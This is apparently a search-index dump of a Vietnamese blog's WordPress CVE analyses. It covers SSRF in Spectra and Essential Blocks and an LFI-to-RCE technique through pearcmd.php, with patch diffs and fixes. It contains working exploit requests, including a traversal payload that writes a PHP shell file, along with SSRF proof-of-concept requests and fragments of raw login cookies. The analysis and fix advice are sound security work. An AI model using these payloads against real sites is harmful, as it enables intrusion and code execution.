wordpress_86a9106ae65537651a8e456835b316ab=con%7C1761196421%7CqXmKZUf4pSlgQ1P9tEQA71pnVWLNanpuqdHLXAZXyFJ%7Cf3dc677b2e483f598ad00a36fbd2f18ed1ed5015b39fc2df533aeb573a8dc3fd; wp-settings-time-2=1761027443; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=con%7C1761196421%7CqXmKZUf4pSlgQ1P9tEQA71pnVWLNanpuqdHLXAZXyFJ%7C1e8333233a2233576e988302d4f19d5c92470de4cc2bf4c1e31fb65788a44d35 action=ast_block_templates_importer\u0026_ajax_nonce=3ef4c6d6df\u0026api_uri=http://127.0.0.1:8001/test Result: Đọc nội dung từ local service\r","date":"2025-10-23","objectID":"/vi/posts/2025-10-23-cve-2023-36679/:4:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2023-36679 Analysis \u0026 POC","uri":"/vi/posts/2025-10-23-cve-2023-36679/#proof-of-concept-poc"},{"categories":["CVE Analyst"],"collections":null,"content":"Conclusion\rPhiên bản ≤ 2.6.6 của plugin Spectra (Ultimate Addons for Gutenberg) tồn tại lỗ hổng SSRF do sử dụng wp_remote_get() với URL do người dùng cung cấp mà không giới hạn hoặc xác thực nguồn. Điều này cho phép tài khoản có quyền Contributor gửi request từ máy chủ WordPress đến các địa chỉ nội bộ. ","date":"2025-10-23","objectID":"/vi/posts/2025-10-23-cve-2023-36679/:4:3","tags":["analyst","plugin","ssrf"],"title":"CVE-2023-36679 Analysis \u0026 POC","uri":"/vi/posts/2025-10-23-cve-2023-36679/#conclusion"},{"categories":["CVE Analyst"],"collections":null,"content":"Key takeaways\rKhông tin tưởng URL từ client, chỉ dùng dữ liệu có sẵn trên server. Ưu tiên dùng wp_safe_remote_get() thay cho wp_remote_get(). Kiểm tra phản hồi HTTP (status, MIME, nội dung). Giới hạn quyền gọi request chỉ cho vai trò cần thiết. ","date":"2025-10-23","objectID":"/vi/posts/2025-10-23-cve-2023-36679/:4:4","tags":["analyst","plugin","ssrf"],"title":"CVE-2023-36679 Analysis \u0026 POC","uri":"/vi/posts/2025-10-23-cve-2023-36679/#key-takeaways"},{"categories":["CVE Analyst"],"collections":null,"content":"References\rSSRF (Server Side Request Forgery) — Hacktrick WordPress Spectra Plugin \u003c= 2.6.6 is vulnerable to Server Side Request Forgery (SSRF) ","date":"2025-10-23","objectID":"/vi/posts/2025-10-23-cve-2023-36679/:5:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2023-36679 Analysis \u0026 POC","uri":"/vi/posts/2025-10-23-cve-2023-36679/#references"},{"categories":["CVE Analyst"],"collections":null,"content":"Technical analysis and proof-of-concept demonstrating an LFI bypass (forced .php suffix) leveraging pearcmd.php","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/","tags":["analyst","lfi","plugin","pearcmd"],"title":"Exploiting LFI2RCE Vulnerability via PHP PEARCMD","uri":"/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/"},{"categories":["CVE Analyst"],"collections":null,"content":"Xin chào. Sau khi phân tích 10 CVE liên quan đến LFI trên các plugin WordPress, tôi nhận thấy một rào cản chung: nhiều vector khai thác bị giới hạn bởi yêu cầu phải có hậu tố .php. Điều này làm giảm đáng kể khả năng khai thác. Trong quá trình tìm hiểu, tôi tìm thấy bài viết docker-php-include-getshell. Bài đó mô tả cách bypass ràng buộc .php bằng cách lợi dụng file pearcmd.php vốn nằm trong bộ công cụ PECL/PEAR của PHP và có sẵn trong môi trường WordPress được triển khai trên Docker - một mẹo rất thực tế cho kịch bản không cho upload file. ","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/:0:0","tags":["analyst","lfi","plugin","pearcmd"],"title":"Exploiting LFI2RCE Vulnerability via PHP PEARCMD","uri":"/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/#"},{"categories":["CVE Analyst"],"collections":null,"content":"PEAR và PECL là gì?\rPECL (PHP Extension Community Library): công cụ dòng lệnh để cài và quản lý extension PHP. PEAR (PHP Extension and Application Repository): thư viện nền tảng cho PECL. Trước PHP 7.3, PEAR/PECL thường được cài mặc định. Từ PHP 7.4 trở đi, cần biên dịch PHP với --with-pear để có chúng. Tuy nhiên, trong các Docker image PHP chính thức, PEAR/PECL vẫn thường được cài sẵn, nằm ở /usr/local/lib/php: root@e182501c47c4:/var/www/html# ls /usr/local/lib/php Archive Console OS PEAR PEAR.php Structures System.php XML build data doc extensions pearcmd.php peclcmd.php test ","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/:1:0","tags":["analyst","lfi","plugin","pearcmd"],"title":"Exploiting LFI2RCE Vulnerability via PHP PEARCMD","uri":"/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/#pear-và-pecl-là-gì"},{"categories":["CVE Analyst"],"collections":null,"content":"pearcmd.php và register_argc_argv\rpearcmd.php là một script PHP thiết kế để chạy ở chế độ dòng lệnh, ví dụ: php /usr/local/lib/php/pearcmd.php install somepackage Nó xử lý các tham số từ $argv và $argc. Khi chạy như CLI thì dữ liệu này rõ ràng. Nếu file này được include trong bối cảnh web (do LFI), logic CLI của nó có thể bị lợi dụng. Điểm then chốt là cấu hình register_argc_argv. Nếu register_argc_argv = On, PHP sẽ tạo: $argc $argv $_SERVER['argv'] `argv` trong cấu hình PHP\rKhi thiết lập WordPress trên Docker, register_argc_argv thường bật mặc định. Vấn đề đặt ra: khi PHP chạy dưới SAPI web (FPM/Apache) và không phải CLI, $argv lấy dữ liệu từ đâu? ","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/:2:0","tags":["analyst","lfi","plugin","pearcmd"],"title":"Exploiting LFI2RCE Vulnerability via PHP PEARCMD","uri":"/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/#pearcmdphp-và-register_argc_argv"},{"categories":["CVE Analyst"],"collections":null,"content":"Analysis PHP Source Code\rTrong PHP core có logic như sau: if (PG(register_argc_argv)) { if (SG(request_info).argc) { ... } else { php_build_argv(SG(request_info).query_string, \u0026PG(http_globals)[TRACK_VARS_SERVER]); } } Nếu không có argc (không chạy CLI), PHP gọi php_build_argv với SG(request_info).query_string - tức query string của URL. Ví dụ: http://example.com/index.php?a=b\u0026c=d → query_string = \"a=b\u0026c=d\" PHP sẽ dùng query string này để tạo biến argv, do đó $_SERVER['argv'] có thể bị ảnh hưởng bởi query string. Hậu quả: Khi pearcmd.php được include qua LFI trong môi trường web mà $_SERVER['argv'] được sinh từ query string, attacker có thể điều khiển các tham số dòng lệnh mà pearcmd.php đọc được. Do đó, chức năng dòng lệnh của PEAR/PECL có thể bị lợi dụng qua web để thực hiện hành động không mong muốn. ","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/:3:0","tags":["analyst","lfi","plugin","pearcmd"],"title":"Exploiting LFI2RCE Vulnerability via PHP PEARCMD","uri":"/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/#analysis-php-source-code"},{"categories":["CVE Analyst"],"collections":null,"content":"RFC3875 Explain\rRFC3875 (CGI spec) định nghĩa một dạng “indexed” HTTP query - tức là chuỗi truy vấn không chứa dấu = chưa mã hóa và được gửi qua phương thức GET hoặc HEAD. Khi gặp loại truy vấn này, server nên (SHOULD) coi phần query-string như một search-string, tách thành các search-word bằng dấu +: search-string = search-word ( \"+\" search-word ) search-word = 1*schar Sau khi tách, mỗi search-word sẽ được URL-decode, có thể mã hóa lại theo hệ thống, rồi thêm vào danh sách đối số dòng lệnh (argv) của chương trình CGI. Nói ngắn gọn: nếu query-string không có dấu = và là yêu cầu GET hoặc HEAD, máy chủ có thể coi các phần ngăn cách bằng + như các tham số dòng lệnh và truyền vào argv. RFC3875 cho phép server biến một query-string “indexed” (GET/HEAD, không có ký tự = chưa mã hóa) thành danh sách từ, rồi đưa vào argv. Phần mô tả trong tiêu chuẩn như sau: 4.4. The Script Command Line Some systems support a method for supplying an array of strings to the CGI script. This is only used in the case of an 'indexed' HTTP query, which is identified by a 'GET' or 'HEAD' request with a URI query string that does not contain any unencoded \"=\" characters. For such a request, the server SHOULD treat the query-string as a search-string and parse it into words, using the rules search-string = search-word ( \"+\" search-word ) search-word = 1*schar schar = unreserved | escaped | xreserved xreserved = \";\" | \"/\" | \"?\" | \":\" | \"@\" | \"\u0026\" | \"=\" | \",\" | \"$\" After parsing, each search-word is URL-decoded, optionally encoded in a system-defined manner and then added to the command line argument list. PHP từng có lỗ hổng liên quan (CVE-2012-1823). Hiện nay, PHP xử lý query-string rộng hơn RFC - ngay cả khi query-string có dấu =, nó vẫn có thể được đưa vào $_SERVER['argv']. PHP vẫn thêm query-string có dấu `=` vào $_SERVER['argv']\r👉 Khi truyền query string theo dạng ?a+b+c+..., PHP sẽ tách chuỗi tại các dấu + và tạo ra biến $_SERVER['argv'] dưới dạng một mảng chứa các phần tử ['a', 'b', 'c', ...], đúng theo cơ chế được mô tả trong RFC3875. ","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/:4:0","tags":["analyst","lfi","plugin","pearcmd"],"title":"Exploiting LFI2RCE Vulnerability via PHP PEARCMD","uri":"/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/#rfc3875-explain"},{"categories":["CVE Analyst"],"collections":null,"content":"Testing PEAR in CLI\rTrong bài viết của tác giả có đề cập đến payload liên quan đến config-create, được mô tả là dùng để tạo file cấu hình. Mô tả về config-create\rKhi tôi thử chạy lệnh trên CLI: root@e182501c47c4:/var/www/html# php /usr/local/lib/php/pearcmd.php config-create config-create: must have 2 parameters, root path and filename to save as Khi không truyền đủ tham số, chương trình báo lỗi và yêu cầu hai tham số bắt buộc: root path: thư mục gốc mà PEAR dùng để cài đặt các package và tìm cấu hình. filename: đường dẫn tới file cấu hình sẽ được tạo ra. Thử chạy với tham số đầy đủ: root@e182501c47c4:/var/www/html# php /usr/local/lib/php/pearcmd.php config-create test_root_path test_filename.php Root directory must be an absolute path beginning with \"/\", was: \"test_root_path\" Ở đây PEAR yêu cầu test_root_path phải là đường dẫn tuyệt đối, tức là phải có dấu / ở đầu. Khi chạy lại với đường dẫn hợp lệ: root@e182501c47c4:/var/www/html# php /usr/local/lib/php/pearcmd.php config-create /test_root_path test_filename.php Kết quả trả về: Configuration (channel pear.php.net): ===================================== Auto-discover new Channels auto_discover \u003cnot set\u003e Default Channel default_channel pear.php.net HTTP Proxy Server Address http_proxy \u003cnot set\u003e PEAR server [DEPRECATED] master_server \u003cnot set\u003e Default Channel Mirror preferred_mirror \u003cnot set\u003e Remote Configuration File remote_config \u003cnot set\u003e PEAR executables directory bin_dir /test_root_path/pear PEAR documentation directory doc_dir /test_root_path/pear/docs PHP extension directory ext_dir /test_root_path/pear/ext PEAR directory php_dir /test_root_path/pear/php PEAR Installer cache directory cache_dir /test_root_path/pear/cache PEAR configuration file cfg_dir /test_root_path/pear/cfg directory PEAR data directory data_dir /test_root_path/pear/data PEAR Installer download download_dir /test_root_path/pear/download directory Systems manpage files man_dir /test_root_path/pear/man directory PEAR metadata directory metadata_dir \u003cnot set\u003e PHP CLI/CGI binary php_bin \u003cnot set\u003e php.ini location php_ini \u003cnot set\u003e --program-prefix passed to php_prefix \u003cnot set\u003e PHP's ./configure --program-suffix passed to php_suffix \u003cnot set\u003e PHP's ./configure PEAR Installer temp directory temp_dir /test_root_path/pear/temp PEAR test directory test_dir /test_root_path/pear/tests PEAR www files directory www_dir /test_root_path/pear/www Cache TimeToLive cache_ttl \u003cnot set\u003e Preferred Package State preferred_state \u003cnot set\u003e Unix file mask umask \u003cnot set\u003e Debug Log Level verbose \u003cnot set\u003e PEAR password (for password \u003cnot set\u003e maintainers) Signature Handling Program sig_bin \u003cnot set\u003e Signature Key Directory sig_keydir \u003cnot set\u003e Signature Key Id sig_keyid \u003cnot set\u003e Package Signature Type sig_type \u003cnot set\u003e PEAR username (for username \u003cnot set\u003e maintainers) User Configuration File Filename /var/www/html/test_filename.php System Configuration File Filename #no#system#config# Successfully created default configuration file \"/var/www/html/test_filename.php\" Kết quả cho thấy các đường dẫn con cho từng loại dữ liệu được tự động sinh ra dưới /test_root_path/pear. Ở dòng cuối cùng: Successfully created default configuration file \"/var/www/html/test_filename.php\" File cấu hình được tạo trong thư mục hiện hành, không nằm trong root_path. Đây là hành vi mặc định của PEAR: root_path chỉ ảnh hưởng đến cấu trúc thư mục cài đặt, không quyết định vị trí lưu file cấu hình. Khi truy cập file \"/var/www/html/test_filename.php\" trên trình duyệt: Nội dung của test_filename.php được render trên trình duyệt\rFile được tạo có chứa thông tin về test_root_path, được trình bày ở dạng serialize Tuy nhiên, đó mới chỉ là quá trình thực thi trên CLI. Trong trường hợp khai thác qua web, cần phân tích mã nguồn để xem cách chương trình tiếp nhận và xử lý các tham số được truyền vào. ","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/:5:0","tags":["analyst","lfi","plugin","pearcmd"],"title":"Exploiting LFI2RCE Vulnerability via PHP PEARCMD","uri":"/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/#testing-pear-in-cli"},{"categories":["CVE Analyst"],"collections":null,"content":"pearcmd Code Analysis\rTrước khi phân tích mã nguồn của /usr/local/lib/php/pearcmd.php, cần thiết lập môi trường debug để nắm rõ luồng thực thi - tham khảo: https://w41bu1.github.io/2025-10-22-wordpress-local-and-debugging-docker/ Sau đó hãy copy toàn bộ mã nguồn php từ container về máy thật, giữ nguyên cấu trúc thư mục, để khi debugger dừng tại /usr/local/lib/php/pearcmd.php bạn vẫn có thể mở và theo dõi file tương ứng với container: sudo docker cp wordpress:/usr/local/lib/php/ /usr/local/lib/php/ require_once 'PEAR.php'; require_once 'PEAR/Frontend.php'; require_once 'PEAR/Config.php'; require_once 'PEAR/Command.php'; require_once 'Console/Getopt.php'; $all_commands = PEAR_Command::getCommands(); ... $argv = Console_Getopt::readPHPArgv(); ... $options = Console_Getopt::getopt2($argv, \"c:C:d:D:Gh?sSqu:vV\"); array_shift($argv); ... $command = (isset($options[1][0])) ? $options[1][0] : null; ... if ($fetype == 'Gtk2') { ... } else { do { ... $cmd = PEAR_Command::factory($command, $config); ... list($tmpopt, $params) = $tmp; ... $ok = $cmd-\u003erun($command, $opts, $params); if ($ok === false) { PEAR::raiseError(\"unknown command `$command'\"); } ... } while (false); } Đầu tiên, tất cả các command sẽ được load vào $all_commands $all_commands = PEAR_Command::getCommands(); public static function getCommands() { if (empty($GLOBALS['_PEAR_Command_commandlist'])) { PEAR_Command::registerCommands(); } return $GLOBALS['_PEAR_Command_commandlist']; } getCommands() gọi đến registerCommands() để đăng ký các command. Tất cả các command được load vào `$all_commands`\rSau đó $argv được khởi tạo $argv = Console_Getopt::readPHPArgv(); public static function readPHPArgv() { global $argv; if (!is_array($argv)) { if (!@is_array($_SERVER['argv'])) { if (!@is_array($GLOBALS['HTTP_SERVER_VARS']['argv'])) { $msg = \"Could not read cmd args (register_argc_argv=Off?)\"; return PEAR::raiseError(\"Console_Getopt: \" . $msg); } return $GLOBALS['HTTP_SERVER_VARS']['argv']; } return $_SERVER['argv']; } return $argv; } Nếu $argv không phải mảng (tức là không có dữ liệu hợp lệ), hàm sẽ cố gắng tìm giá trị tương đương ở $_SERVER['argv'] và trả về, tức các search-word đường ta truyền trong URL. ví dụ: GET /wp-admin/admin-ajax.php?action=geo_mashup_query\u0026object_ids=2\u0026template=../../../../../../../usr/local/lib/php/pearcmd\u0026+config-create+/test_root_path+test_filename.php HTTP/1.1 Quan sát trong debugger: Giá trị của `$argv` trong debugger\rNgay sau đó $argv sẽ được loại bỏ phần tử thứ nhất rồi trở thành đối số của Console_Getopt::getopt2(), gía trị trả về gán cho $options array_shift($argv); $options = Console_Getopt::getopt2($argv, \"c:C:d:D:Gh?sSqu:vV\"); Giá trị bây giờ là: Giá trị của `$argv` và `$options` trong debugger\rBiến $command được khởi tạo với giá trị $options[1][0] tức config-create trong trường hợp này. $command = (isset($options[1][0])) ? $options[1][0] : null; Sau đó 1 factory được tạo và gán vào $cmd $cmd = PEAR_Command::factory($command, $config); Khi hover vào $cmd ta thấy được các tham số yêu cầu của lệnh config-create Các tham số yêu cầu của lệnh `config-create`\rVà đặc biệt, ta thấy hàm thực thi cho config-create là doConfigCreate function doConfigCreate($command, $options, $params) { if (count($params) != 2) { return PEAR::raiseError('config-create: must have 2 parameters, root path and ' . 'filename to save as'); } $root = $params[0]; // Clean up the DIRECTORY_SEPARATOR mess $ds2 = DIRECTORY_SEPARATOR . DIRECTORY_SEPARATOR; $root = preg_replace(array('!\\\\\\\\+!', '!/+!', \"!$ds2+!\"), array('/', '/', '/'), $root); if ($root[0] != '/') { if (!isset($options['windows'])) { return PEAR::raiseError('Root directory must be an absolute path beginning ' . 'with \"/\", was: \"' . $root . '\"'); } if (!preg_match('/^[A-Za-z]:/', $root)) { return PEAR::raiseError('Root directory must be an absolute path beginning ' . 'with \"\\\\\" or \"C:\\\\\", was: \"' . $root . '\"'); } } $windows = isset($options['windows']); if ($windows) { $root = str_replace('/', '\\\\', $root); } if (!file_","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/:6:0","tags":["analyst","lfi","plugin","pearcmd"],"title":"Exploiting LFI2RCE Vulnerability via PHP PEARCMD","uri":"/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/#pearcmd-code-analysis"},{"categories":["CVE Analyst"],"collections":null,"content":"Flow\rGửi GET request: GET /wp-admin/admin-ajax.php?action=geo_mashup_query\u0026object_ids=2\u0026template=../../../../../../../usr/local/lib/php/pearcmd\u0026+config-create+/test_root_path+test_filename.php Web include /usr/local/lib/php/pearcmd.php. PHP (register_argc_argv=On) build $_SERVER['argv'] từ query → ['action=geo_mashup_query\u0026object_ids=2\u0026template=../../../../../../../usr/local/lib/php/pearcmd\u0026','config-create','/test_root_path','test_filename.php']. Console_Getopt::readPHPArgv() trả $argv; Console_Getopt::getopt2() parse ra $command='config-create' và list($tmpopt, $params) trả về $params=['/test_root_path','test_filename.php']. doConfigCreate() chạy với $params do attacker kiểm soát → touch()/realpath() và writeConfigFile() tạo/ghi file. Thông tin\rFile cấu hình được tạo có chứa giá trị root path. Nếu giá trị này bị ghi dưới dạng một thẻ PHP hợp lệ (\u003c?php ... ?\u003e) và file có thể được truy cập bởi client, webserver sẽ xử lý nội dung PHP trong file đó và đoạn mã sẽ được thực thi dẫn tới RCE ","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/:7:0","tags":["analyst","lfi","plugin","pearcmd"],"title":"Exploiting LFI2RCE Vulnerability via PHP PEARCMD","uri":"/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/#flow"},{"categories":["CVE Analyst"],"collections":null,"content":"Exploit\rTận dụng CVE-2025-48293 đã phân tích để khai thác mở rộng bằng pearcmd.php Gửi request chứa LFI payload trỏ đến pearcmd.php GET /wp-admin/admin-ajax.php?action=geo_mashup_query\u0026object_ids=2\u0026template=../../../../../../../usr/local/lib/php/pearcmd\u0026+config-create+/\u003c?=phpinfo();?\u003e+/var/www/html/shell.php HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: http://localhost/wp-admin/ Connection: keep-alive Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Sec-Fetch-User: ?1 X-PwnFox-Color: blue Priority: u=0, i Response trả về thành công: Response trả về thành công\rTruy cập shell.php shell.php\r","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/:8:0","tags":["analyst","lfi","plugin","pearcmd"],"title":"Exploiting LFI2RCE Vulnerability via PHP PEARCMD","uri":"/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/#exploit"},{"categories":["CVE Analyst"],"collections":null,"content":"Security Vulnerability in WordPress Essential Blocks for Gutenberg Plugin.","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-cve-2025-11361/","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11361 Analysis \u0026 POC","uri":"/vi/posts/2025-10-22-cve-2025-11361/"},{"categories":["CVE Analyst"],"collections":null,"content":"CVE \u0026 Basic Info\rPlugin Gutenberg Essential Blocks – Page Builder for Gutenberg Blocks \u0026 Patterns cho WordPress bị lỗ hổng Server-Side Request Forgery (SSRF) trong tất cả các phiên bản lên tới và bao gồm 5.7.1, thông qua hàm eb_save_ai_generated_image. Điều này cho phép kẻ tấn công đã xác thực, có quyền Author-level trở lên, thực hiện các yêu cầu web tới bất kỳ địa chỉ nào xuất phát từ ứng dụng web và có thể bị lợi dụng để truy vấn và chỉnh sửa thông tin từ các dịch vụ nội bộ. CVE ID: CVE-2025-11361 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 5.7.1 Patched Versions: 5.7.2 CVSS severity: Low (5.5) Required Privilege: Author Product: WordPress Essential Blocks for Gutenberg Plugin ","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-cve-2025-11361/:1:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11361 Analysis \u0026 POC","uri":"/vi/posts/2025-10-22-cve-2025-11361/#cve--basic-info"},{"categories":["CVE Analyst"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Essential Blocks for Gutenberg: 5.7.1 (vulnerable) và 5.7.2 (patched). Diff tool - Meld hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản. ","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-cve-2025-11361/:2:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11361 Analysis \u0026 POC","uri":"/vi/posts/2025-10-22-cve-2025-11361/#requirements"},{"categories":["CVE Analyst"],"collections":null,"content":"Analysis\r","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-cve-2025-11361/:3:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11361 Analysis \u0026 POC","uri":"/vi/posts/2025-10-22-cve-2025-11361/#analysis"},{"categories":["CVE Analyst"],"collections":null,"content":"Patch diff\rBản lỗi: public function eb_save_ai_generated_image() { if ( ! isset( $_POST[ 'admin_nonce' ] ) || ! wp_verify_nonce( sanitize_key( $_POST[ 'admin_nonce' ] ), 'admin-nonce' ) ) { wp_send_json_error( __( 'Nonce Error', 'essential-blocks' ) ); } if ( ! current_user_can( 'upload_files' ) ) { wp_send_json_error( __( 'You are not authorized to upload files!', 'essential-blocks' ) ); } // Check if we have either image_url or image_b64 along with prompt if ( ( isset( $_POST[ 'image_url' ] ) || isset( $_POST[ 'image_b64' ] ) ) \u0026\u0026 isset( $_POST[ 'prompt' ] ) ) { $image_url = isset( $_POST[ 'image_url' ] ) ? esc_url_raw( $_POST[ 'image_url' ] ) : null; $image_body = ''; // Handle URL format if ( $image_url ) { // Download the image from OpenAI URL $image_data = wp_remote_get( $image_url, [ 'timeout' =\u003e 60 ] ); if ( is_wp_error( $image_data ) ) { wp_send_json_error( [ 'message' =\u003e __( 'Failed to download image from OpenAI.', 'essential-blocks' ) ] ); return; } // Detect image format and set appropriate extension and MIME type $image_info = getimagesizefromstring( $image_body ); $mime_type = $image_info ? $image_info[ 'mime' ] : 'image/png'; // Determine file extension based on MIME type $extension = 'png'; // default switch ( $mime_type ) { case 'image/jpeg': $extension = 'jpg'; break; case 'image/png': $extension = 'png'; break; case 'image/webp': $extension = 'webp'; break; case 'image/gif': $extension = 'gif'; break; } $image_body = wp_remote_retrieve_body( $image_data ); } // other logic } else { wp_send_json_error( __( 'Image data (URL or base64) and prompt are required', 'essential-blocks' ) ); } } Trong phiên bản lỗi, sử dụng wp_remote_get($image_url) để tải hình ảnh mà không xác thực hoặc giới hạn nguồn URL. Không kiểm tra mã phản hồi HTTP, MIME type hay nội dung thực tế của tệp trả về, khiến kẻ tấn công có thể lợi dụng gửi yêu cầu SSRF đến các dịch vụ nội bộ hoặc tải về dữ liệu độc hại giả dạng hình ảnh. Bản vá: public function eb_save_ai_generated_image() { if ( ! isset( $_POST[ 'admin_nonce' ] ) || ! wp_verify_nonce( sanitize_key( $_POST[ 'admin_nonce' ] ), 'admin-nonce' ) ) { wp_send_json_error( __( 'Nonce Error', 'essential-blocks' ) ); } if ( ! current_user_can( 'upload_files' ) ) { wp_send_json_error( __( 'You are not authorized to upload files!', 'essential-blocks' ) ); } // Check if we have either image_url or image_b64 along with prompt if ( ( isset( $_POST[ 'image_url' ] ) || isset( $_POST[ 'image_b64' ] ) ) \u0026\u0026 isset( $_POST[ 'prompt' ] ) ) { $image_url = isset( $_POST[ 'image_url' ] ) ? esc_url_raw( $_POST[ 'image_url' ] ) : null; $image_body = ''; // Handle URL format if ( $image_url ) { // Download the image from validated URL $image_data = wp_safe_remote_get( $image_url, [ 'timeout' =\u003e 30, 'redirection' =\u003e 3, 'user-agent' =\u003e 'Essential Blocks/' . ESSENTIAL_BLOCKS_VERSION, 'headers' =\u003e [ 'Accept' =\u003e 'image/*' ] ] ); if ( is_wp_error( $image_data ) ) { wp_send_json_error( [ 'message' =\u003e __( 'Failed to download image from URL.', 'essential-blocks' ) ] ); return; } // Validate response $response_code = wp_remote_retrieve_response_code( $image_data ); if ( $response_code !== 200 ) { wp_send_json_error( [ 'message' =\u003e __( 'Invalid response from image URL.', 'essential-blocks' ) ] ); return; } // Security: Validate image content and size if ( ! $this-\u003eis_valid_image_content( $image_body ) ) { wp_send_json_error( [ 'message' =\u003e __( 'Invalid image content provided.', 'essential-blocks' ) ] ); return; } // Detect image format and set appropriate extension and MIME type $image_info = getimagesizefromstring( $image_body ); if ( ! $image_info ) { wp_send_json_error( [ 'message' =\u003e __( 'Unable to determine image format.', 'essential-blocks' ) ] ); return; } $mime_type = $image_info[ 'mime' ]; // Security: Only allow specific image MIME types $allowed_mime_types = [ 'image/jpeg', 'image/png', 'image/webp', 'image/gif' ]; if ( ! in_array( $mime_type, $allowed_mime_types, true ) ) { wp_send_json_error( [ 'message' =\u003e __(","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-cve-2025-11361/:3:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11361 Analysis \u0026 POC","uri":"/vi/posts/2025-10-22-cve-2025-11361/#patch-diff"},{"categories":["CVE Analyst"],"collections":null,"content":"Vulnerable Code\reb_save_ai_generated_image() được đăng ký làm callback cho action hook, với hook name wp_ajax_save_ai_generated_image add_action( 'wp_ajax_save_ai_generated_image', [ $this, 'eb_save_ai_generated_image' ] ); Tức khi truy cập endpoint /wp-admin/admin-ajax.php với param action=save_ai_generated_image thì eb_save_ai_generated_image() được gọi. Để wp_remote_get() được thực thi, ta cần vượt qua các điều kiện sau: check admin_nonce if ( ! isset( $_POST[ 'admin_nonce' ] ) || ! wp_verify_nonce( sanitize_key( $_POST[ 'admin_nonce' ] ), 'admin-nonce' ) ) { wp_send_json_error( __( 'Nonce Error', 'essential-blocks' ) ); } Mặc định khi truy cập wp-admin, admin_nonce sẽ được set, có thể tìm thấy bằng cách inspect code và tìm với từ khóa admin_nonce Tìm admin_nonce bằng cách inspect code Check user-level if ( ! current_user_can( 'upload_files' ) ) { wp_send_json_error( __( 'You are not authorized to upload files!', 'essential-blocks' ) ); } upload_files yêu cầu user Author-level trở lên POST request chứa image_url và prompt param. if ( ( isset( $_POST[ 'image_url' ] ) || isset( $_POST[ 'image_b64' ] ) ) \u0026\u0026 isset( $_POST[ 'prompt' ] ) ) ","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-cve-2025-11361/:3:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11361 Analysis \u0026 POC","uri":"/vi/posts/2025-10-22-cve-2025-11361/#vulnerable-code"},{"categories":["CVE Analyst"],"collections":null,"content":"Exploit\r","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-cve-2025-11361/:4:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11361 Analysis \u0026 POC","uri":"/vi/posts/2025-10-22-cve-2025-11361/#exploit"},{"categories":["CVE Analyst"],"collections":null,"content":"Local Server\rTạo local service đơn giản bằng python from flask import Flask, jsonify, request, send_from_directory import os BASE_DIR = os.path.abspath(os.getcwd()) app = Flask(__name__) @app.route('/test') def test(): return send_from_directory(BASE_DIR, 'requirements.txt', as_attachment=True) if __name__ == '__main__': app.run(host='0.0.0.0', port=8001, debug=True) hello ","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-cve-2025-11361/:4:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11361 Analysis \u0026 POC","uri":"/vi/posts/2025-10-22-cve-2025-11361/#local-server"},{"categories":["CVE Analyst"],"collections":null,"content":"Proof of Concept (PoC)\rGửi request với image_url trỏ đến local service http://127.0.0.1:8001/test bằng user Author POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 